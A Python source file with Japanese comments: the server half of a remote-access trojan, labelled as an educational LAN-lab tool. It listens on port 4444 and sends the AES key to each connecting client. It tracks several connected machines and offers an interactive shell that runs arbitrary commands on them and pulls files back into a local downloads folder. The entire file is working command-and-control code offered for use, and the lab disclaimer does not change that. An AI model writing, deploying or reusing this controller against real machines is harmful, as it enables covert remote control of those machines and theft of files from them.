#!/usr/bin/env python3
"""
LANラボ用サーバー - 教育目的専用
許可されたラボ環境でのみ使用してください

用途:
- 同一Wi-Fiネットワーク内での実験
- VirtualBox環境
- ポートフォワーディング不要

特徴:
- AES-256暗号化
- ファイル転送
- コマンド実行
"""

import socket
import threading
import json
import base64
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

class LANServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_count = 0
        self.key = get_random_bytes(32)
        
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return json.dumps({'iv': iv, 'ciphertext': ct})
    
    def decrypt(self, json_input):
        try:
            b64 = json.loads(json_input)
            iv = base64.b64decode(b64['iv'])
            ct = base64.b64decode(b64['ciphertext'])
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8')
        except Exception as e:
            return f"復号化エラー: {e}"
    
    def handle_client(self, client_socket, client_id, address):
        try:
            client_socket.send(base64.b64encode(self.key))
            system_info = client_socket.recv(4096).decode()
            
            self.clients[client_id] = {
                'socket': client_socket,
                'address': address,
                'info': system_info
            }
            
            print(f"\nクライアント {client_id} が接続しました: {address[0]}:{address[1]}")
            print(f"システム情報:\n{system_info}")
            
        except Exception as e:
            print(f"エラーが発生しました: {e}")
            client_socket.close()
    
    def send_command(self, client_id, command):
        try:
            client = self.clients[client_id]
            encrypted_cmd = self.encrypt(command)
            client['socket'].send(encrypted_cmd.encode())
            
            response = client['socket'].recv(65536)
            if response:
                return self.decrypt(response.decode())
            return "応答がありません"
        except Exception as e:
            return f"エラー: {e}"
    
    def download_file(self, client_id, remote_path):
        try:
            command = f"download|{remote_path}"
            client = self.clients[client_id]
            encrypted_cmd = self.encrypt(command)
            client['socket'].send(encrypted_cmd.encode())
            
            file_data = b""
            while True:
                chunk = client['socket'].recv(4096)
                if chunk.endswith(b"<FILE_END>"):
                    file_data += chunk[:-10]
                    break
                file_data += chunk
            
            decrypted_data = self.decrypt(file_data.decode())
            
            if decrypted_data.startswith("[!]"):
                return decrypted_data
            
            filename = os.path.basename(remote_path)
            local_path = f"downloads/{client_id}_{filename}"
            os.makedirs("downloads", exist_ok=True)
            
            with open(local_path, 'wb') as f:
                f.write(base64.b64decode(decrypted_data))
            
            return f"ダウンロードが完了しました: {local_path}"
        except Exception as e:
            return f"エラー: {e}"
    
    def list_clients(self):
        if not self.clients:
            print("\n接続中のクライアントはありません")
            return
        
        print("\n" + "="*70)
        print("接続中のクライアント:")
        print("="*70)
        for cid, client in self.clients.items():
            addr = client['address']
            print(f"ID: {cid} | {addr[0]}:{addr[1]}")
            print(f"情報: {client['info'][:100]}...")
            print("-"*70)
    
    def interactive_shell(self, client_id):
        if client_id not in self.clients:
            print("無効なクライアントIDです")
            return
        
        print(f"\nクライアント {client_id} との対話セッションを開始しました")
        print("'back' で戻る、'help' でヘルプを表示")
        
        while True:
            try:
                command = input(f"\nShell[{client_id}]> ").strip()
                
                if command.lower() == 'back':
                    break
                elif command.lower() == 'help':
                    print("""
コマンド:
  download <パス>  - ファイルダウンロード
  sysinfo         - システム情報
  back            - メインメニューへ
  
通常コマンド:
  ls, pwd, whoami, cat など
                    """)
                    continue
                elif command == '':
                    continue
                elif command.startswith('download '):
                    path = command.split(' ', 1)[1]
                    result = self.download_file(client_id, path)
                    print(result)
                else:
                    result = self.send_command(client_id, command)
                    print(result)
            except KeyboardInterrupt:
                print("\nシェルを終了します")
                break
            except Exception as e:
                print(f"エラーが発生しました: {e}")
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def start(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.port))
            server.listen(5)
            
            local_ip = self.get_local_ip()
            
            print(f"""
+----------------------------------------------------------+
|     同一LAN実験用サーバー                                |
+----------------------------------------------------------+

ネットワーク情報:
  ローカルIP: {local_ip}
  ポート: {self.port}

クライアント接続コマンド:
  python3 client.py {local_ip} {self.port}

リスニング開始: {self.host}:{self.port}
クライアントからの接続を待機中...
            """)
            
            def accept_connections():
                while True:
                    try:
                        client_socket, address = server.accept()
                        self.client_count += 1
                        client_id = self.client_count
                        
                        thread = threading.Thread(
                            target=self.handle_client,
                            args=(client_socket, client_id, address)
                        )
                        thread.daemon = True
                        thread.start()
                    except:
                        break
            
            accept_thread = threading.Thread(target=accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            while True:
                try:
                    cmd = input("\nMain> ").strip()
                    
                    if cmd == 'list':
                        self.list_clients()
                    elif cmd.startswith('interact '):
                        try:
                            cid = int(cmd.split()[1])
                            self.interactive_shell(cid)
                        except:
                            print("使用方法: interact <クライアントID>")
                    elif cmd == 'help':
                        print("""
メインコマンド:
  list            - クライアント一覧
  interact <ID>   - クライアントと対話
  help            - ヘルプ
  exit            - 終了
                        """)
                    elif cmd == 'exit':
                        print("サーバーを終了します")
                        break
                    elif cmd == '':
                        continue
                    else:
                        print("不明なコマンドです。'help' で利用可能なコマンドを表示します")
                except KeyboardInterrupt:
                    print("\n終了します")
                    break
            
            server.close()
        except Exception as e:
            print(f"エラーが発生しました: {e}")

if __name__ == "__main__":
    server = LANServer()
    server.start()
